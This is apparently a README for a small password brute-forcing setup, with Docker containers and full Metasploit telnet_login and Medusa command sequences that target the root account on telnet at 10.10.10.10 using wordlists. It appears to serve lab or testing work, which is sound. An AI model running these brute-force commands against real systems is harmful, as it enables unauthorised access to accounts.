# passwords

### generate all char combinations
Modify `password-generator.py` and run `./password-generator.py`


### Setup
```docker-compose build```

### Metasploit
 * start container session with `docker-compose run metasploit bash`.
 * start session with `msfconsole`
 * load telnet module `use auxiliary/scanner/telnet/telnet_login`
 * see options: `show options`

```
set BLANK_PASSWORDS true
set PASS_FILE /tmp/config/az/1-5.txt
set USERNAME root
set RHOSTS 10.10.10.10
run
```

```
set BLANK_PASSWORDS true
set USERPASS_FILE /tmp/config/telnet.metasploit.txt
set USERNAME root
set RHOSTS 10.10.10.10
run
```


### Medusa
https://hackertarget.com/brute-forcing-passwords-with-ncrack-hydra-and-medusa/
  * Start container session with `docker-compose run medusa bash`.

```
medusa -u root -P /tmp/config/telnet.medusa.txt -h 10.10.10.10 -M telnet
```
